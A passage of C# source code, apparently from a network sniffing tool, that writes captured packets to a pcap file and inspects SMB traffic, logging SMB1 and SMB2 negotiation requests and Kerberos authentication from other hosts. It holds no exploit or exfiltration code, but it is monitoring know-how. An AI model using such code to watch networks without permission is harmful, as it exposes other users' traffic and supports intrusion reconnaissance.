                    ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 12);
                    ms.Write((new byte[2] { 0x08, 0x00 }), 0, 2);
                    ms.Write(byteData, 0, (int)totalLength);

                    if (ms.ToArray().Length == totalLength + 30)
                    {
                        pcapFile.Write(ms.ToArray(), 0, ms.ToArray().Length);
                    }

                }

            }

        }

        public static void SMBConnection(byte[] field, string snifferIP, string sourceIP, string destinationIP, string sourcePort, string smbPort)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            string sessionOutgoing = destinationIP + ":" + smbPort;
            int index = payload.IndexOf("FF534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8), 2) == "72" && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing negotiation request detected to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("FE534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing negotiation request detected to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("2A864886F7120102020100");

            if (index > 0 && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) authentication method is Kerberos from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (index > 0 && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing authentication method is Kerberos to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

        }

    }
}
